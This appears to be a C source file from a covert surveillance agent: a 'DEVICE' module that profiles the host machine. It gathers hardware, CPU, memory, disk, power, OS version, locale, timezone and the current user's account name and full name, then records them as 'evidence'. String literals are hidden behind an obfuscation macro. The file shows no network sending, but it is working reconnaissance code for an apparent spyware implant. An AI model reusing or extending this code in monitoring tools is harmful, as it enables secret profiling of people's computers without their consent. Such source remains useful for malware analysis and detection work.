#define _GNU_SOURCE
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/statvfs.h>
#include <sys/utsname.h>
#include <sys/time.h>
#include <pwd.h>
#include <openssl/bio.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "bioutils.h"

void device_hw(BIO *b);
void device_os(BIO *b);
void device_user(BIO *b);

void *module_device_main(void *args)
{
   BIO *bio_utf8 = NULL, *bio_utf16 = NULL;
   char *ptr = NULL;
   long len;

   debugme("Module DEVICE started\n");

   do {
      if(!(bio_utf8 = BIO_new(BIO_s_mem()))) break;

      device_hw(bio_utf8);
      device_os(bio_utf8);
      device_user(bio_utf8);

      if(!(len = BIO_get_mem_data(bio_utf8, &ptr))) break;
      if(!(bio_utf16 = BIO_new(BIO_s_mem()))) break;
      if(BIO_puts16(bio_utf16, ptr) == -1) break;
      if(!(len = BIO_get_mem_data(bio_utf16, &ptr))) break;
      evidence_write(EVIDENCE_TYPE_DEVICE, NULL, 0, ptr, len);
   } while(0);
   if(bio_utf8) BIO_free(bio_utf8);
   if(bio_utf16) BIO_free(bio_utf16);

   debugme("Module DEVICE stopped\n");

   return NULL;
}

void device_hw(BIO *b)
{
   FILE *fp = NULL;
   char buf[128] = {}, *ptr = NULL;
   char vendor[128] = {}, model[128] = {};
   char cpu[128] = {};
   unsigned int ncpu = 1;
   unsigned long long memt = 0, memf = 0;
   unsigned long long diskt = 0, diskf = 0;
   struct statvfs s;
   char acstate[128] = {};

   if((fp = fopen(SO"/sys/devices/virtual/dmi/id/sys_vendor", "r")) && fgets(vendor, sizeof(vendor), fp)) if(vendor[0] && (vendor[strlen(vendor) - 1] == '\n')) vendor[strlen(vendor) - 1] = '\0';
   if(fp) fclose(fp);

   if((fp = fopen(SO"/sys/devices/virtual/dmi/id/product_name", "r")) && fgets(model, sizeof(model), fp)) if(model[0] && (model[strlen(model) - 1] == '\n')) model[strlen(model) - 1] = '\0';
   if(fp) fclose(fp);

   if((fp = fopen(SO"/proc/cpuinfo", "r"))) {
      while(fgets(buf, sizeof(buf), fp)) {
         if(!cpu[0] && !strncmp(buf, SO"model name", strlen(SO"model name"))) {
            if((ptr = strstr(buf, ": ") + 2)) {
               strncpy(cpu, ptr, sizeof(cpu) - 1);
               if(cpu[0] && (cpu[strlen(cpu) - 1] == '\n')) cpu[strlen(cpu) - 1] = '\0';
            }
         } else if(!strncmp(buf, SO"processor", strlen(SO"processor"))) {
            if((ptr = strstr(buf, ": ") + 2)) ncpu = atoi(ptr) + 1;
         }
      }
      fclose(fp);
   }

   if((fp = fopen(SO"/proc/meminfo", "r"))) {
      while(fgets(buf, sizeof(buf), fp)) {
         if(!memt && !strncmp(buf, SO"MemTotal:", strlen(SO"MemTotal:"))) {
            ptr = buf + strlen(SO"MemTotal:");
            while(*ptr && (*ptr == ' ')) ptr++;
            memt = atoll(ptr) / 1024;
         } else if(!strncmp(buf, SO"MemFree:", strlen(SO"MemFree:"))) {
            ptr = buf + strlen(SO"MemFree:");
            while(*ptr && (*ptr == ' ')) ptr++;
            memf += atoll(ptr) / 1024;
         } else if(!strncmp(buf, SO"Cached:", strlen(SO"Cached:"))) {
            ptr = buf + strlen(SO"Cached:");
            while(*ptr && (*ptr == ' ')) ptr++;
            memf += atoll(ptr) / 1024;
         }
      }
      if(memf > memt) memf = memt;
      fclose(fp);
   }

   if((ptr = getcwd(NULL, 0))) {
      if(!statvfs(ptr, &s)) {
         diskt = ((unsigned long long)s.f_blocks * (unsigned long long)s.f_bsize / 1048576LL);
         diskf = ((unsigned long long)s.f_bavail * (unsigned long long)s.f_bsize / 1048576LL);
      }
      free(ptr);
  } 

   if((fp = fopen(SO"/proc/acpi/ac_adapter/AC/state", "r"))) {
      while(fgets(buf, sizeof(buf), fp)) {
         if(!acstate[0] && !strncmp(buf, SO"state:", strlen(SO"state:"))) {
            ptr = buf + strlen(SO"state:");
            while(*ptr && (*ptr == ' ')) ptr++;
            strncpy(acstate, ptr, sizeof(acstate) - 1);
            if(acstate[0] && (acstate[strlen(acstate) - 1] == '\n')) acstate[strlen(acstate) - 1] = '\0';
         }
      }
      fclose(fp);
   }

   BIO_printf(b, SO"Device: %s %s\n", vendor[0] ? vendor : SO"[unknown]", model[0] ? model : SO"[unknown]");
   BIO_printf(b, SO"Processor: %u x %s\n", ncpu, cpu[0] ? cpu : SO"[unknown]");
   BIO_printf(b, SO"Memory: %lluMB free / %lluMB total (%u%% used)\n", memf, memt, (memt ? (memt - memf) * 100 / memt : 0));
   BIO_printf(b, SO"Disk: %lluMB free / %lluMB total (%u%% used)\n", diskf, diskt, (diskt ? (diskt - diskf) * 100 / diskt : 0));
   BIO_printf(b, SO"Power: AC %s\n", acstate[0] ? acstate : SO"[unknown]");
   BIO_puts(b, "\n");

   return;
}

void device_os(BIO *b)
{
   struct utsname arch = {0};
   char *lang = NULL;
   time_t t;
   struct tm ts;
   char tzname[8] = {}, tzoff[8] = {};
   FILE *fp = NULL;
   char osver[128] = {}, buf[128] =  {}, *ptr = NULL;

   uname(&arch);

   lang = getenv(SO"LANG");

   t = time(NULL);
   localtime_r(&t, &ts);
   strftime(tzname, sizeof(tzname), "%Z", &ts);
   strftime(tzoff, sizeof(tzoff), "%z", &ts);
   tzoff[6] = '\0';
   tzoff[5] = tzoff[4];
   tzoff[4] = tzoff[3];
   tzoff[3] = ':';

   do {
      if((fp = fopen(SO"/etc/lsb-release", "r"))) {
         while(fgets(buf, sizeof(buf), fp)) {
            if(!strncmp(buf, SO"DISTRIB_DESCRIPTION=", strlen(SO"DISTRIB_DESCRIPTION="))) {
               ptr = buf + strlen(SO"DISTRIB_DESCRIPTION=");
               while(*ptr && ((*ptr == ' ') || (*ptr == '"'))) ptr++;
               strncpy(osver, ptr, sizeof(osver) - 1);
            }
         }
         fclose(fp);
         fp = NULL;
      }
      if(osver[0]) break;

      if((fp = fopen(SO"/etc/os-release", "r"))) {
         while(fgets(buf, sizeof(buf), fp)) {
            if(!strncmp(buf, SO"PRETTY_NAME=", strlen(SO"PRETTY_NAME="))) {
               ptr = buf + strlen(SO"PRETTY_NAME=");
               while(*ptr && ((*ptr == ' ') || (*ptr == '"'))) ptr++;
               strncpy(osver, ptr, sizeof(osver) - 1);
            }
         }
         fclose(fp);
         fp = NULL;
      }
      if(osver[0]) break;

      if((fp = fopen(SO"/etc/debian_version", "r"))) {
         if(!fgets(buf, sizeof(buf), fp)) break;
         snprintf(osver, sizeof(osver), SO"Debian GNU/Linux %s", buf);
      } else if((fp = fopen(SO"/etc/redhat-release", "r"))) {
         if(!fgets(buf, sizeof(buf), fp)) break;
         strncpy(osver, buf, sizeof(osver) - 1);
      } else if((fp = fopen(SO"/etc/slackware-version", "r"))) {
         if(!fgets(buf, sizeof(buf), fp)) break;
         strncpy(osver, buf, sizeof(osver) - 1);
      }
   } while(0);
   if(fp) fclose(fp);
   while(osver && osver[0] && ((osver[strlen(osver) - 1] == '"') || (osver[strlen(osver) - 1] == '\n'))) osver[strlen(osver) - 1] = '\0';

   BIO_printf(b, SO"OS Version: %s (%s)\n", osver ? osver : SO"[unknown]", arch.machine[0] ? arch.machine : SO"[unknown]");
   BIO_printf(b, SO"Locale settings: %s - %s (UTC %s)\n", lang ? lang : SO"[uknown]", tzname, tzoff);
   BIO_puts(b, "\n");

   return;
}

void device_user(BIO *b)
{
   struct passwd pw, *ret = NULL;
   char buf[4096], *ptr = NULL;

   getpwuid_r(getuid(), &pw, buf, sizeof(buf), &ret);
   if(ret) if((ptr = strchr(ret->pw_gecos, ','))) *ptr = '\0';

   BIO_printf(b, SO"User: %s (%s)\n", ret ? ret->pw_name : SO"[uknown]", ret ? ret->pw_gecos : SO"[uknown]");
   BIO_puts(b, "\n");

   return;
}
